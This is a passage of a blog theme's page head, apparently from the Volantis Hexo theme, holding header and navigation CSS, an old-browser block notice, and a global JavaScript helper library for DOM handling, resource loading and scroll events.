  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
}
@media screen and (min-width: 2048px) {
  .l_header #wrapper .nav-sub {
    max-width: 55vw;
    margin: auto;
  }
}
.l_header #wrapper.sub .nav-sub {
  opacity: 1;
  -webkit-opacity: 1;
  -moz-opacity: 1;
}
.l_header #wrapper .title {
  position: relative;
  color: var(--color-text);
  padding-left: 24px;
  max-height: 64px;
}
.l_header #wrapper .nav-main .title {
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
  flex-shrink: 0;
  line-height: 64px;
  padding: 0 24px;
  font-size: 1.25rem;
  font-family: "Varela Round", "PingFang SC", "Microsoft YaHei", Helvetica, Arial, Helvetica, monospace;
}
.l_header #wrapper .nav-main .title img {
  height: 64px;
}
.l_header .nav-sub {
  max-width: 1280px;
  margin: auto;
}
.l_header .nav-sub .title {
  font-weight: bold;
  font-family: UbuntuMono, "Varela Round", "PingFang SC", "Microsoft YaHei", Helvetica, Arial, Menlo, Monaco, monospace, sans-serif;
  line-height: 1.2;
  max-height: 64px;
  white-space: normal;
  flex-shrink: 1;
}
.l_header .switcher {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
  line-height: 64px;
  align-items: center;
}
.l_header .switcher .s-toc {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
}
@media screen and (max-width: 768px) {
  .l_header .switcher .s-toc {
    display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
    display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
    display: -ms-flexbox /* TWEENER - IE 10 */;
    display: -webkit-flex /* NEW - Chrome */;
    display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
    display: flex;
  }
}
.l_header .switcher >li {
  height: 48px;
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
  margin: 2px;
}
@media screen and (max-width: 500px) {
  .l_header .switcher >li {
    margin: 0 1px;
    height: 48px;
  }
}
.l_header .switcher >li >a {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  justify-content: center;
  -webkit-justify-content: center;
  -khtml-justify-content: center;
  -moz-justify-content: center;
  -o-justify-content: center;
  -ms-justify-content: center;
  align-items: center;
  width: 48px;
  height: 48px;
  padding: 0.85em 1.1em;
  border-radius: 100px;
  -webkit-border-radius: 100px;
  border: none;
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
  color: #3dd9b6;
}
.l_header .switcher >li >a:hover {
  border: none;
}
.l_header .switcher >li >a.active,
.l_header .switcher >li >a:active {
  border: none;
  background: var(--color-site-bg);
}
@media screen and (max-width: 500px) {
  .l_header .switcher >li >a {
    width: 36px;
    height: 48px;
  }
}
.l_header .nav-sub .switcher {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
}
.l_header .m_search {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  height: 64px;
  width: 240px;
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
@media screen and (max-width: 1024px) {
  .l_header .m_search {
    width: 44px;
    min-width: 44px;
  }
  .l_header .m_search input::placeholder {
    opacity: 0;
    -webkit-opacity: 0;
    -moz-opacity: 0;
  }
  .l_header .m_search:hover {
    width: 240px;
  }
  .l_header .m_search:hover input::placeholder {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@media screen and (min-width: 500px) {
  .l_header .m_search:hover .input {
    width: 100%;
  }
  .l_header .m_search:hover .input::placeholder {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@media screen and (max-width: 500px) {
  .l_header .m_search {
    min-width: 0;
  }
  .l_header .m_search input::placeholder {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
.l_header .m_search .form {
  position: relative;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  width: 100%;
  align-items: center;
}
.l_header .m_search .icon {
  position: absolute;
  width: 36px;
  left: 5px;
  color: var(--color-meta);
}
@media screen and (max-width: 500px) {
  .l_header .m_search .icon {
    display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
    display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
    display: none;
  }
}
.l_header .m_search .input {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  padding-top: 8px;
  padding-bottom: 8px;
  line-height: 1.3;
  width: 100%;
  color: var(--color-text);
  background: #fafafa;
  box-shadow: none;
  -webkit-box-shadow: none;
  box-sizing: border-box;
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  padding-left: 40px;
  font-size: 0.875rem;
  border-radius: 8px;
  -webkit-border-radius: 8px;
  border: none;
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
@media screen and (min-width: 500px) {
  .l_header .m_search .input:focus {
    box-shadow: 0 4px 8px 0px rgba(0,0,0,0.1);
    -webkit-box-shadow: 0 4px 8px 0px rgba(0,0,0,0.1);
  }
}
@media screen and (max-width: 500px) {
  .l_header .m_search .input {
    background: var(--color-block);
    padding-left: 8px;
    border: none;
  }
  .l_header .m_search .input:hover,
  .l_header .m_search .input:focus {
    border: none;
  }
}
@media (max-width: 500px) {
  .l_header .m_search {
    left: 0;
    width: 0;
    overflow: hidden;
    position: absolute;
    background: #fff;
    transition: all 0.28s ease;
    -webkit-transition: all 0.28s ease;
    -khtml-transition: all 0.28s ease;
    -moz-transition: all 0.28s ease;
    -o-transition: all 0.28s ease;
    -ms-transition: all 0.28s ease;
  }
  .l_header .m_search .input {
    border-radius: 32px;
    -webkit-border-radius: 32px;
    margin-left: 16px;
    padding-left: 16px;
  }
  .l_header.z_search-open .m_search {
    width: 100%;
  }
  .l_header.z_search-open .m_search .input {
    width: calc(100% - 120px);
  }
}
ul.m-pc >li>a {
  color: inherit;
  border-bottom: 2px solid transparent;
}
ul.m-pc >li>a:active,
ul.m-pc >li>a.active {
  border-bottom: 2px solid #3dd9b6;
}
ul.m-pc li:hover >ul.list-v,
ul.list-v li:hover >ul.list-v {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
}
ul.nav-list-h {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  align-items: stretch;
}
ul.nav-list-h>li {
  position: relative;
  justify-content: center;
  -webkit-justify-content: center;
  -khtml-justify-content: center;
  -moz-justify-content: center;
  -o-justify-content: center;
  -ms-justify-content: center;
  height: 100%;
  line-height: 2.4;
  border-radius: 4px;
  -webkit-border-radius: 4px;
}
ul.nav-list-h>li >a {
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  font-weight: 600;
}
ul.list-v {
  z-index: 1;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
  position: absolute;
  background: var(--color-card);
  box-shadow: 0 2px 4px 0px rgba(0,0,0,0.08), 0 4px 8px 0px rgba(0,0,0,0.08), 0 8px 16px 0px rgba(0,0,0,0.08);
  -webkit-box-shadow: 0 2px 4px 0px rgba(0,0,0,0.08), 0 4px 8px 0px rgba(0,0,0,0.08), 0 8px 16px 0px rgba(0,0,0,0.08);
  margin-top: -6px;
  border-radius: 4px;
  -webkit-border-radius: 4px;
  padding: 8px 0;
}
ul.list-v.show {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
}
ul.list-v hr {
  margin-top: 8px;
  margin-bottom: 8px;
}
ul.list-v >li {
  white-space: nowrap;
  word-break: keep-all;
}
ul.list-v >li.header {
  font-size: 0.78125rem;
  font-weight: bold;
  line-height: 2em;
  color: var(--color-meta);
  margin: 8px 16px 4px;
}
ul.list-v >li.header i {
  margin-right: 8px;
}
ul.list-v >li ul {
  margin-left: 0;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
  margin-top: -40px;
}
ul.list-v .aplayer-container {
  min-height: 64px;
  padding: 6px 16px;
}
ul.list-v >li>a {
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  color: var(--color-list);
  font-size: 0.875rem;
  font-weight: bold;
  line-height: 36px;
  padding: 0 20px 0 16px;
  text-overflow: ellipsis;
  margin: 0 4px;
  border-radius: 4px;
  -webkit-border-radius: 4px;
}
@media screen and (max-width: 1024px) {
  ul.list-v >li>a {
    line-height: 40px;
  }
}
ul.list-v >li>a >i {
  margin-right: 8px;
}
ul.list-v >li>a:active,
ul.list-v >li>a.active {
  color: var(--color-list-hl);
}
ul.list-v >li>a:hover {
  color: var(--color-list-hl);
  background: var(--color-site-bg);
}
.l_header .menu >ul>li>a {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  padding: 0 8px;
}
.l_header .menu >ul>li>a >i {
  margin-right: 4px;
}
.l_header ul.nav-list-h>li {
  color: var(--color-list);
  line-height: 64px;
}
.l_header ul.nav-list-h>li >a {
  max-height: 64px;
  overflow: hidden;
  color: inherit;
}
.l_header ul.nav-list-h>li >a:active,
.l_header ul.nav-list-h>li >a.active {
  color: #3dd9b6;
}
.l_header ul.nav-list-h>li:hover>a {
  color: var(--color-list-hl);
}
.l_header ul.nav-list-h>li i.music {
  animation: rotate-effect 1.5s linear infinite;
  -webkit-animation: rotate-effect 1.5s linear infinite;
  -khtml-animation: rotate-effect 1.5s linear infinite;
  -moz-animation: rotate-effect 1.5s linear infinite;
  -o-animation: rotate-effect 1.5s linear infinite;
  -ms-animation: rotate-effect 1.5s linear infinite;
}
@-moz-keyframes rotate-effect {
  0% {
    transform: rotate(0);
    -webkit-transform: rotate(0);
    -khtml-transform: rotate(0);
    -moz-transform: rotate(0);
    -o-transform: rotate(0);
    -ms-transform: rotate(0);
  }
  25% {
    transform: rotate(90deg);
    -webkit-transform: rotate(90deg);
    -khtml-transform: rotate(90deg);
    -moz-transform: rotate(90deg);
    -o-transform: rotate(90deg);
    -ms-transform: rotate(90deg);
  }
  50% {
    transform: rotate(180deg);
    -webkit-transform: rotate(180deg);
    -khtml-transform: rotate(180deg);
    -moz-transform: rotate(180deg);
    -o-transform: rotate(180deg);
    -ms-transform: rotate(180deg);
  }
  75% {
    transform: rotate(270deg);
    -webkit-transform: rotate(270deg);
    -khtml-transform: rotate(270deg);
    -moz-transform: rotate(270deg);
    -o-transform: rotate(270deg);
    -ms-transform: rotate(270deg);
  }
  100% {
    transform: rotate(360deg);
    -webkit-transform: rotate(360deg);
    -khtml-transform: rotate(360deg);
    -moz-transform: rotate(360deg);
    -o-transform: rotate(360deg);
    -ms-transform: rotate(360deg);
  }
}
@-webkit-keyframes rotate-effect {
  0% {
    transform: rotate(0);
    -webkit-transform: rotate(0);
    -khtml-transform: rotate(0);
    -moz-transform: rotate(0);
    -o-transform: rotate(0);
    -ms-transform: rotate(0);
  }
  25% {
    transform: rotate(90deg);
    -webkit-transform: rotate(90deg);
    -khtml-transform: rotate(90deg);
    -moz-transform: rotate(90deg);
    -o-transform: rotate(90deg);
    -ms-transform: rotate(90deg);
  }
  50% {
    transform: rotate(180deg);
    -webkit-transform: rotate(180deg);
    -khtml-transform: rotate(180deg);
    -moz-transform: rotate(180deg);
    -o-transform: rotate(180deg);
    -ms-transform: rotate(180deg);
  }
  75% {
    transform: rotate(270deg);
    -webkit-transform: rotate(270deg);
    -khtml-transform: rotate(270deg);
    -moz-transform: rotate(270deg);
    -o-transform: rotate(270deg);
    -ms-transform: rotate(270deg);
  }
  100% {
    transform: rotate(360deg);
    -webkit-transform: rotate(360deg);
    -khtml-transform: rotate(360deg);
    -moz-transform: rotate(360deg);
    -o-transform: rotate(360deg);
    -ms-transform: rotate(360deg);
  }
}
@-o-keyframes rotate-effect {
  0% {
    transform: rotate(0);
    -webkit-transform: rotate(0);
    -khtml-transform: rotate(0);
    -moz-transform: rotate(0);
    -o-transform: rotate(0);
    -ms-transform: rotate(0);
  }
  25% {
    transform: rotate(90deg);
    -webkit-transform: rotate(90deg);
    -khtml-transform: rotate(90deg);
    -moz-transform: rotate(90deg);
    -o-transform: rotate(90deg);
    -ms-transform: rotate(90deg);
  }
  50% {
    transform: rotate(180deg);
    -webkit-transform: rotate(180deg);
    -khtml-transform: rotate(180deg);
    -moz-transform: rotate(180deg);
    -o-transform: rotate(180deg);
    -ms-transform: rotate(180deg);
  }
  75% {
    transform: rotate(270deg);
    -webkit-transform: rotate(270deg);
    -khtml-transform: rotate(270deg);
    -moz-transform: rotate(270deg);
    -o-transform: rotate(270deg);
    -ms-transform: rotate(270deg);
  }
  100% {
    transform: rotate(360deg);
    -webkit-transform: rotate(360deg);
    -khtml-transform: rotate(360deg);
    -moz-transform: rotate(360deg);
    -o-transform: rotate(360deg);
    -ms-transform: rotate(360deg);
  }
}
@keyframes rotate-effect {
  0% {
    transform: rotate(0);
    -webkit-transform: rotate(0);
    -khtml-transform: rotate(0);
    -moz-transform: rotate(0);
    -o-transform: rotate(0);
    -ms-transform: rotate(0);
  }
  25% {
    transform: rotate(90deg);
    -webkit-transform: rotate(90deg);
    -khtml-transform: rotate(90deg);
    -moz-transform: rotate(90deg);
    -o-transform: rotate(90deg);
    -ms-transform: rotate(90deg);
  }
  50% {
    transform: rotate(180deg);
    -webkit-transform: rotate(180deg);
    -khtml-transform: rotate(180deg);
    -moz-transform: rotate(180deg);
    -o-transform: rotate(180deg);
    -ms-transform: rotate(180deg);
  }
  75% {
    transform: rotate(270deg);
    -webkit-transform: rotate(270deg);
    -khtml-transform: rotate(270deg);
    -moz-transform: rotate(270deg);
    -o-transform: rotate(270deg);
    -ms-transform: rotate(270deg);
  }
  100% {
    transform: rotate(360deg);
    -webkit-transform: rotate(360deg);
    -khtml-transform: rotate(360deg);
    -moz-transform: rotate(360deg);
    -o-transform: rotate(360deg);
    -ms-transform: rotate(360deg);
  }
}
.menu-phone li ul.list-v {
  right: calc(100% - 0.5 * 16px);
}
.menu-phone li ul.list-v ul {
  right: calc(100% - 0.5 * 16px);
}
#wrapper {
  max-width: 1280px;
  margin: auto;
}
@media screen and (min-width: 2048px) {
  #wrapper {
    max-width: 55vw;
  }
}
#wrapper .menu {
  -webkit-box-flex: 1;
  -moz-box-flex: 1;
  -webkit-flex: 1 1;
  -ms-flex: 1 1;
  flex: 1 1;
  margin: 0 16px 0 0;
}
#wrapper .menu .list-v ul {
  left: calc(100% - 0.5 * 16px);
}
.menu-phone {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
  margin-top: 16px;
  right: 8px;
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
.menu-phone ul {
  right: calc(100% - 0.5 * 16px);
}
@media screen and (max-width: 500px) {
  .menu-phone {
    display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
    display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
    display: block;
  }
}
.l_header {
  max-width: 65vw;
  left: calc((100% - 65vw) * 0.5);
  border-bottom-left-radius: 8px;
  border-bottom-right-radius: 8px;
}
@media screen and (max-width: 2048px) {
  .l_header {
    max-width: 1312px;
    left: calc((100% - 1312px) * 0.5);
  }
}
@media screen and (max-width: 1312px) {
  .l_header {
    left: 0;
    border-radius: 0;
    -webkit-border-radius: 0;
    max-width: 100%;
  }
}
@media screen and (max-width: 500px) {
  .l_header .container {
    margin-left: 0;
    margin-right: 0;
  }
  .l_header #wrapper .nav-main .title {
    padding-left: 16px;
    padding-right: 16px;
  }
  .l_header #wrapper .nav-sub {
    width: 100%;
  }
  .l_header #wrapper .nav-sub .title {
    overflow-y: scroll;
    margin-top: 2px;
    padding: 8px 16px;
  }
  .l_header #wrapper .switcher {
    display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
    display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
    display: -ms-flexbox /* TWEENER - IE 10 */;
    display: -webkit-flex /* NEW - Chrome */;
    display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
    display: flex;
    margin-right: 8px;
  }
  .l_header .menu {
    display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
    display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
    display: none;
  }
}
@media screen and (max-width: 500px) {
  .list-v li {
    max-width: 270px;
  }
}
#u-search {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  padding: 60px 20px;
  z-index: 1001;
}
@media screen and (max-width: 680px) {
  #u-search {
    padding: 0px;
  }
}
@media screen and (prefers-color-scheme: dark) and (max-width: 500px) {
  .l_header .m_search {
    background: var(--color-site-bg) !important;
  }
}

  </style>
  <link rel="stylesheet" href="/en/css/style.css" media="print" onload="this.media='all';this.onload=null">
  <noscript><link rel="stylesheet" href="/en/css/style.css"></noscript>
    <script>
      let userColorScheme=localStorage.getItem("color-scheme")
      if(userColorScheme){
        document.documentElement.setAttribute("color-scheme", userColorScheme);
      }
    </script>
  
<script>
if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode))
    document.write(
	'<style>'+
		'html{'+
			'overflow-x: hidden !important;'+
			'overflow-y: hidden !important;'+
		'}'+
		'.kill-ie{'+
			'text-align:center;'+
			'height: 100%;'+
			'margin-top: 15%;'+
			'margin-bottom: 5500%;'+
		'}'+
    '.kill-t{'+
      'font-size: 2rem;'+
    '}'+
    '.kill-c{'+
      'font-size: 1.2rem;'+
    '}'+
		'#l_header,#l_body{'+
			'display: none;'+
		'}'+
	'</style>'+
    '<div class="kill-ie">'+
        `<span class="kill-t"><b>Sorry, your browser cannot access this site</b></span><br/>`+
        `<span class="kill-c">Microsoft has terminated support for Internet Explorer (IE) 10 and earlier versions in 2016. <br/>There are great security risks to continue using it. Please use contemporary mainstream browsers to access.</span><br/>`+
        `<a target="_blank" rel="noopener" href="https://blogs.windows.com/windowsexperience/2021/05/19/the-future-of-internet-explorer-on-windows-10-is-in-microsoft-edge/"><strong>Learn more ></strong></a>`+
    '</div>');
</script>


<noscript>
	<style>
		html{
			overflow-x: hidden !important;
			overflow-y: hidden !important;
		}
		.kill-noscript{
			text-align:center;
			height: 100%;
			margin-top: 15%;
			margin-bottom: 5500%;
		}
    .kill-t{
      font-size: 2rem;
    }
    .kill-c{
      font-size: 1.2rem;
    }
		#l_header,#l_body{
			display: none;
		}
	</style>
    <div class="kill-noscript">
        <span class="kill-t"><b>Sorry, your browser cannot access this site</b></span><br/>
        <span class="kill-c">This page requires browser support (enable) JavaScript</span><br/>
        <a target="_blank" rel="noopener" href="https://www.baidu.com/s?wd=启用JavaScript"><strong>Learn more ></strong></a>
    </div>
</noscript>


  <script>
  /************这个文件存放不需要重载的全局变量和全局函数*********/
  window.volantis = {}; // volantis 全局变量
  volantis.debug = "env"; // 调试模式
  volantis.dom = {}; // 页面Dom see: /source/js/app.js etc.
  /******************** volantis.dom.$ ********************************/
  // 注：这里没有选择器，也没有forEach一次只处理一个dom，这里重新封装主题常用的dom方法，返回的是dom对象，对象包含了以下方法，同时保留dom的原生API
  function volantisDom(ele) {
    if (!ele) ele = document.createElement("div")
    this.ele = ele;
    // ==============================================================
    this.ele.find = (c) => {
      let q = this.ele.querySelector(c)
      if (q)
        return new volantisDom(q)
    }
    // ==============================================================
    this.ele.hasClass = (c) => {
      return this.ele.className.match(new RegExp('(\\s|^)' + c + '(\\s|$)'));
    }
    this.ele.addClass = (c) => {
      this.ele.classList.add(c);
      return this.ele
    }
    this.ele.removeClass = (c) => {
      this.ele.classList.remove(c);
      return this.ele
    }
    this.ele.toggleClass = (c) => {
      if (this.ele.hasClass(c)) {
        this.ele.removeClass(c)
      } else {
        this.ele.addClass(c)
      }
      return this.ele
    }
    // ==============================================================
    this.ele.on = (c, f) => {
      this.ele.addEventListener(c, f, false)
      return this.ele
    }
    this.ele.click = (f, r) => {
      this.ele.on("click", f, r)
      return this.ele
    }
    this.ele.scroll = (f, r) => {
      this.ele.on("scroll", f, r)
      return this.ele
    }
    // ==============================================================
    this.ele.html = (c) => {
      // if(c=== undefined){
      //   return this.ele.innerHTML
      // }else{
      this.ele.innerHTML = c
      return this.ele
      // }
    }
    // ==============================================================
    this.ele.hide = (c) => {
      this.ele.style.display = "none"
      return this.ele
    }
    this.ele.show = (c) => {
      this.ele.style.display = "block"
      return this.ele
    }
    // ==============================================================
    return this.ele
  }
  volantis.dom.$ = (ele) => {
    return !!ele ? new volantisDom(ele) : null;
  }
  /******************** RunItem ********************************/
  function RunItem() {
    this.list = []; // 存放回调函数
    this.start = () => {
      for (var i = 0; i < this.list.length; i++) {
        this.list[i].run();
      }
    };
    this.push = (fn, name, setRequestAnimationFrame = true) => {
      let myfn = fn
      if (setRequestAnimationFrame) {
        myfn = () => {
          volantis.requestAnimationFrame(fn)
        }
      }
      var f = new Item(myfn, name);
      this.list.push(f);
    };
    this.remove = (name) => {
      for (let index = 0; index < this.list.length; index++) {
        const e = this.list[index];
        if (e.name == name) {
          this.list.splice(index, 1);
        }
      }
    }
    // 构造一个可以run的对象
    function Item(fn, name) {
      // 函数名称
      this.name = name || fn.name;
      // run方法
      this.run = () => {
        try {
          fn()
        } catch (error) {
          console.log(error);
        }
      };
    }
  }
  /******************** RightMenu ********************************/
  // volantis.rightmenu.handle(callBack[,"callBackName"]) 外部菜单项控制
  // 可在 volantis.mouseEvent 处获取右键事件
  volantis.rightmenu = {};
  volantis.rightmenu.method = {
    handle: new RunItem(),
  }
  volantis.rightmenu = Object.assign(volantis.rightmenu, {
    handle: volantis.rightmenu.method.handle.push,
  });
  /********************  Dark Mode  ********************************/
  // /layout/_partial/scripts/darkmode.ejs
  // volantis.dark.mode 当前模式 dark or light
  // volantis.dark.toggle() 暗黑模式触发器
  // volantis.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
  volantis.dark = {};
  volantis.dark.method = {
    toggle: new RunItem(),
  };
  volantis.dark = Object.assign(volantis.dark, {
    push: volantis.dark.method.toggle.push,
  });
  /********************  Message  ********************************/
  // VolantisApp.message
  /********************  isMobile  ********************************/
  // /source/js/app.js
  // volantis.isMobile
  // volantis.isMobileOld
  /********************脚本动态加载函数********************************/
  // volantis.js(src, cb)  cb 可以传入onload回调函数 或者 JSON对象 例如: volantis.js("src", ()=>{}) 或 volantis.js("src", {defer:true,onload:()=>{}})
  // volantis.css(src)

  // 返回Promise对象，如下方法同步加载资源，这利于处理文件资源之间的依赖关系，例如：APlayer 需要在 MetingJS 之前加载
  // (async () => {
  //     await volantis.js("...theme.plugins.aplayer.js.aplayer...")
  //     await volantis.js("...theme.plugins.aplayer.js.meting...")
  // })();

  // 已经加入了setTimeout
  volantis.js = (src, cb) => {
    return new Promise(resolve => {
      setTimeout(function () {
        var HEAD = document.getElementsByTagName("head")[0] || document.documentElement;
        var script = document.createElement("script");
        script.setAttribute("type", "text/javascript");
        if (cb) {
          if (JSON.stringify(cb)) {
            for (let p in cb) {
              if (p == "onload") {
                script[p] = () => {
                  cb[p]()
                  resolve()
                }
              } else {
                script[p] = cb[p]
                script.onload = resolve
              }
            }
          } else {
            script.onload = () => {
              cb()
              resolve()
            };
          }
        } else {
          script.onload = resolve
        }
        script.setAttribute("src", src);
        HEAD.appendChild(script);
      });
    });
  }
  volantis.css = (src) => {
    return new Promise(resolve => {
      setTimeout(function () {
        var link = document.createElement('link');
        link.rel = "stylesheet";
        link.href = src;
        link.onload = resolve;
        document.getElementsByTagName("head")[0].appendChild(link);
      });
    });
  }
  /********************按需加载的插件********************************/
  // volantis.import.jQuery().then(()=>{})
  volantis.import = {
    jQuery: () => {
      if (typeof jQuery == "undefined") {
        return volantis.js("https://unpkg.com/jquery@3.7.1/dist/jquery.min.js")
      } else {
        return new Promise(resolve => {
          resolve()
        });
      }
    }
  }
  /********************** requestAnimationFrame ********************************/
  // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
  // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
  volantis.requestAnimationFrame = (fn) => {
    if (!window.requestAnimationFrame) {
      window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
    }
    window.requestAnimationFrame(fn)
  }
  /************************ layoutHelper *****************************************/
  volantis.layoutHelper = (helper, html, opt) => {
    opt = Object.assign({ clean: false}, opt)
    function myhelper(helper, html, clean) {
      volantis.tempDiv = document.createElement("div");
      volantis.tempDiv.innerHTML = html;
      let layoutHelper = document.querySelector("#layoutHelper-" + helper)
      if (layoutHelper) {
        if (clean) {
          layoutHelper.innerHTML = ""
        }
        layoutHelper.append(volantis.tempDiv);
      }
    }
    myhelper(helper, html, opt.clean)
  }
  /****************************** 滚动事件处理 ****************************************/
  volantis.scroll = {
    engine: new RunItem(),
    unengine: new RunItem(),
  };
  volantis.scroll = Object.assign(volantis.scroll, {
    push: volantis.scroll.engine.push,
  });
  // 滚动条距离顶部的距离
  volantis.scroll.getScrollTop = () => {
    let scrollPos;
    if (window.pageYOffset) {
      scrollPos = window.pageYOffset;
    } else if (document.compatMode && document.compatMode != 'BackCompat') {
      scrollPos = document.documentElement.scrollTop;
    } else if (document.body) {
      scrollPos = document.body.scrollTop;
    }
    return scrollPos;
  }
  volantis.scroll.scrollHeight = function () {
    return Math.max(
      document.body.scrollHeight,
      document.documentElement.scrollHeight,
    )
  }
  volantis.scroll.offsetHeight = function () {
    return Math.max(
      document.body.offsetHeight,
      document.documentElement.offsetHeight,
      document.body.clientHeight,
      document.documentElement.clientHeight
    )
  }
  volantis.scroll.progress = function () {
    return volantis.scroll.getScrollTop() / (volantis.scroll.scrollHeight() - volantis.scroll.offsetHeight())
  }
  // 使用 requestAnimationFrame 处理滚动事件
  // `volantis.scroll.del` 中存储了一个数值, 该数值检测一定时间间隔内滚动条滚动的位移, 数值的检测频率是浏览器的刷新频率. 数值为正数时, 表示向下滚动. 数值为负数时, 表示向上滚动.
  volantis.scroll.handleScrollEvents = () => {
    volantis.scroll.lastScrollTop = volantis.scroll.getScrollTop()
    function loop() {
      const scrollTop = volantis.scroll.getScrollTop();
      if (volantis.scroll.lastScrollTop !== scrollTop) {
        volantis.scroll.del = scrollTop - volantis.scroll.lastScrollTop;
        volantis.scroll.lastScrollTop = scrollTop;
        // if (volantis.scroll.del > 0) {
        //   console.log("向下滚动");
        // } else {
        //   console.log("向上滚动");
        // }
        // 注销过期的unengine未滚动事件
        volantis.scroll.unengine.list = []
        volantis.scroll.engine.start();
      } else {
        volantis.scroll.unengine.start();
      }
      volantis.requestAnimationFrame(loop)
    }
    volantis.requestAnimationFrame(loop)
  }
